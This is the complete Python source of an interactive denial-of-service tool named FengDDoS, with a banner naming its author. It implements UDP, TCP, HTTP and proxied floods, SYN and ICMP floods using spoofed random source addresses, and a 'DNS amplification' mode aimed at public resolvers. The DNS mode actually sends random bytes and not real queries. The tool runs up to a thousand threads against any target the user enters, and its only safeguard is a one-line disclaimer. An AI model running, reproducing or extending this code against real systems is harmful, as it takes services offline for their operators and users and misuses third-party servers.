import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
from socket import gethostbyname

try:
    from scapy.all import IP, TCP, ICMP, UDP, send, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"

class AttackStats:
    def __init__(self):
        self.total_sent = 0
        self.start_time = None
        self.lock = threading.Lock()
        self.running = False
        self.duration_limit = None

    def increment(self, count=1):
        with self.lock:
            self.total_sent += count

    def get_sent(self):
        with self.lock:
            return self.total_sent

    def get_elapsed(self):
        if self.start_time:
            return time.time() - self.start_time
        return 0

    def get_qps(self):
        elapsed = self.get_elapsed()
        if elapsed > 0:
            return self.get_sent() / elapsed
        return 0

    def check_duration(self):
        if self.duration_limit and self.get_elapsed() >= self.duration_limit:
            print(f"\n{color.YELLOW}[!] Duration limit reached ({self.duration_limit}s), stopping!{color.RESET}")
            self.running = False
            return False
        return True

stats = AttackStats()

def show_banner():
    os.system("clear")
    os.system("figlet FengDDoS")
    
    print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
    print(f"{color.BOLD} Author :{color.RESET} FengPwner")
    print(f"{color.BOLD} Github :{color.RESET} https://github.com/FengPwner")
    print(f"{color.BOLD} Atomgit:{color.RESET} https://atomgit.com/FengPwner")
    print(f"{color.BOLD} CSDN   :{color.RESET} https://blog.csdn.net/2302_76189356")
    print(f"{color.BOLD} Version:{color.RESET} 0.4.2")
    print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
    print(f"{color.RED}{color.BOLD} [!] Do not use for illegal purposes!{color.RESET}\n")

def udp_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(packet_size)
            s.sendto(payload, (target_ip, target_port))
            stats.increment()
            s.close()
        except Exception:
            pass
        if not stats.check_duration(): break

def tcp_flood(target_ip, target_port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            payload = random._urandom(packet_size)
            s.sendall(payload)
            stats.increment()
            s.close()
        except Exception:
            pass
        if not stats.check_duration(): break

def syn_flood(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE: return
    while stats.running:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S") / Raw(load=random._urandom(packet_size))
            send(packet, verbose=False)
            stats.increment()
        except Exception:
            pass
        if not stats.check_duration(): break

def icmp_flood(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE: return
    while stats.running:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            packet = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(load=random._urandom(packet_size))
            send(packet, verbose=False)
            stats.increment()
        except Exception:
            pass
        if not stats.check_duration(): break

def http_flood(target_url, port, packet_size):
    while stats.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_url, port))
            request = f"GET / HTTP/1.1\r\nHost: {target_url}\r\nUser-Agent: {random.choice(['Mozilla/5.0','Chrome/91.0','Safari/537.36'])}\r\nAccept: */*\r\n\r\n"
            s.send(request.encode())
            stats.increment()
            s.close()
        except Exception:
            pass
        if not stats.check_duration(): break

def dns_amplification(target_ip, target_port, packet_size):
    if not SCAPY_AVAILABLE: return
    dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "208.67.222.222"]
    while stats.running:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            dns_server = random.choice(dns_servers)
            packet = IP(src=src_ip, dst=dns_server) / UDP(sport=random.randint(1024,65535), dport=53) / Raw(load=random._urandom(packet_size))
            send(packet, verbose=False)
            stats.increment()
        except Exception:
            pass
        if not stats.check_duration(): break

def proxy_flood(target_ip, target_port, packet_size, proxy_list):
    while stats.running:
        try:
            proxy = random.choice(proxy_list)
            proxy_host, proxy_port = proxy.split(":")
            proxy_port = int(proxy_port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((proxy_host, proxy_port))
            connect_request = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
            s.send(connect_request.encode())
            response = s.recv(1024)
            if b"200" in response:
                payload = random._urandom(packet_size)
                s.send(payload)
                stats.increment()
            s.close()
        except Exception:
            pass
        if not stats.check_duration(): break

def monitor_stats():
    while stats.running:
        elapsed = stats.get_elapsed()
        sent = stats.get_sent()
        qps = stats.get_qps()
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        print(f"\r{color.CYAN}[Stats] Sent: {sent} | Elapsed: {minutes}m {seconds}s | QPS: {qps:.1f}{color.RESET}", end="", flush=True)
        time.sleep(1)

def handle_error(allow_edit=True):
    while True:
        if allow_edit:
            choice = input(f"{color.YELLOW}[?] Return to menu (y), Exit (n), or Edit (e): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            elif choice == 'e': return 'e'
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y', 'n', or 'e'.{color.RESET}")
        else:
            choice = input(f"{color.YELLOW}[?] Return to menu (y) or Exit (n): {color.RESET}").strip().lower()
            if choice == 'y': return 'y'
            elif choice == 'n':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            else: print(f"{color.RED}[-] Invalid input. Please enter 'y' or 'n'.{color.RESET}")

def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, "r") as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    proxies.append(line)
    except FileNotFoundError:
        print(f"{color.RED}[-] Proxy file not found: {proxy_file}{color.RESET}")
    return proxies

def run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list=None):
    stats.running = True
    stats.start_time = time.time()
    mode_map = {
        "udp": udp_flood,
        "tcp": tcp_flood,
        "syn": syn_flood,
        "icmp": icmp_flood,
        "http": http_flood,
        "dns": dns_amplification,
        "proxy": proxy_flood
    }
    attack_func = mode_map.get(mode)
    if not attack_func:
        print(f"{color.RED}[-] Unknown attack mode: {mode}{color.RESET}")
        return

    monitor_thread = threading.Thread(target=monitor_stats, daemon=True)
    monitor_thread.start()

    attack_threads = []
    for _ in range(threads):
        if mode == "proxy" and proxy_list:
            t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size, proxy_list))
        else:
            t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size))
        t.daemon = True
        t.start()
        attack_threads.append(t)

    try:
        while stats.running:
            if not stats.check_duration():
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n{color.YELLOW}[!] Attack interrupted by user.{color.RESET}")

    stats.running = False
    for t in attack_threads:
        t.join(timeout=2)

    elapsed = stats.get_elapsed()
    sent = stats.get_sent()
    print(f"\n{color.GREEN}[+] Attack finished. Total sent: {sent} | Duration: {elapsed:.1f}s | Avg QPS: {sent/elapsed if elapsed > 0 else 0:.1f}{color.RESET}")

while True:
    show_banner()
    try:
        while True:
            target = input(f"{color.BLUE}[1/4] IP or Domain (type 'exit' to quit): {color.RESET}")
            if target.strip().lower() == 'exit':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            try:
                target_ip = gethostbyname(target)
                print(f"{color.GREEN}[+] Resolved target to IP: {target_ip}{color.RESET}")
                break
            except socket.gaierror:
                print(f"{color.RED}[-] Error: Could not resolve the specified IP or Domain.{color.RESET}")
                action = handle_error(allow_edit=True)
                if action == 'y': break
                elif action == 'e': continue
        if 'target_ip' not in locals(): continue

        while True:
            port_input = input(f"{color.BLUE}[2/4] Port (1-65535, type 'exit' to quit): {color.RESET}")
            if port_input.strip().lower() == 'exit':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            try:
                target_port = int(port_input)
                if not (1 <= target_port <= 65535): raise ValueError("Port out of range")
                break
            except ValueError:
                print(f"{color.RED}[-] Error: Invalid port. Please enter a number between 1 and 65535.{color.RESET}")
                action = handle_error(allow_edit=True)
                if action == 'y': break
                elif action == 'e': continue
        if 'target_port' not in locals(): continue

        while True:
            print(f"{color.CYAN}Available modes: udp, tcp, syn, icmp, http, dns, proxy{color.RESET}")
            mode = input(f"{color.BLUE}[3/4] Attack mode (type 'exit' to quit): {color.RESET}").strip().lower()
            if mode == 'exit':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            if mode in ["udp","tcp","syn","icmp","http","dns","proxy"]:
                break
            else:
                print(f"{color.RED}[-] Invalid mode. Choose from: udp, tcp, syn, icmp, http, dns, proxy{color.RESET}")
                action = handle_error(allow_edit=True)
                if action == 'y': break
                elif action == 'e': continue
        if mode not in ["udp","tcp","syn","icmp","http","dns","proxy"]: continue

        while True:
            t_input = input(f"{color.BLUE}[4/4] Threads (1~1000, type 'exit' to quit): {color.RESET}")
            if t_input.strip().lower() == 'exit':
                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
                sys.exit(0)
            try:
                threads = int(t_input)
                if not (1 <= threads <= 1000): raise ValueError("Threads out of range")
                break
            except ValueError:
                print(f"{color.RED}[-] Error: Invalid threads. Please enter a number between 1 and 1000.{color.RESET}")
                action = handle_error(allow_edit=True)
                if action == 'y': break
                elif action == 'e': continue
        if 'threads' not in locals(): continue

        os.system("clear")
        print(f"{color.CYAN}{color.BOLD}[*] Attack started... Press Ctrl+C to stop.{color.RESET}\n")
        run_attack(target_ip, target_port, mode, 64, threads)
        handle_error(allow_edit=False)
    except Exception as e:
        print(f"{color.RED}[!] Error: {e}{color.RESET}")
        time.sleep(2)